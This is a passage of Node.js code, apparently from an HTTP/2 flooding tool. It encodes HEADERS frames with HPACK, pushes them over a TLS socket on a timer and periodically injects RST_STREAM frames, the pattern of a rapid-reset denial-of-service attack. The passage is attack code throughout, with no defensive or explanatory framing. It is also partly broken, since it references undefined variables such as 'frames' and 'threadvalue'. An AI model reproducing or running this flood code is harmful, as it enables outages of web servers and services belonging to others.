                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(head)
                ]);

                let streamId =1;
                let streamIdReset = 1;
                const flags = 0x1 | 0x4 | 0x8 | 0x20;
                
                
                const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                
                const frame = Buffer.concat([encodedFrame]);
                if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                
                tlsSocket.write(Buffer.concat([
                  encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                  frames
                 ]));


                } else if (streamId === 2 && (streamId - 2) % 5 === 0) {
                tlsSocket.write(Buffer.concat([threadvalue]));
}
              
                streamIdReset += 2;
                streamId += 2;
                requests.push({ requestPromise, frame });
            }
            try {
                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
            } catch (error) {
            }
                }
                
        }, 500);
        

      
    });

		
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return 
		});




client.on("error", error => {
    
    

    client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//
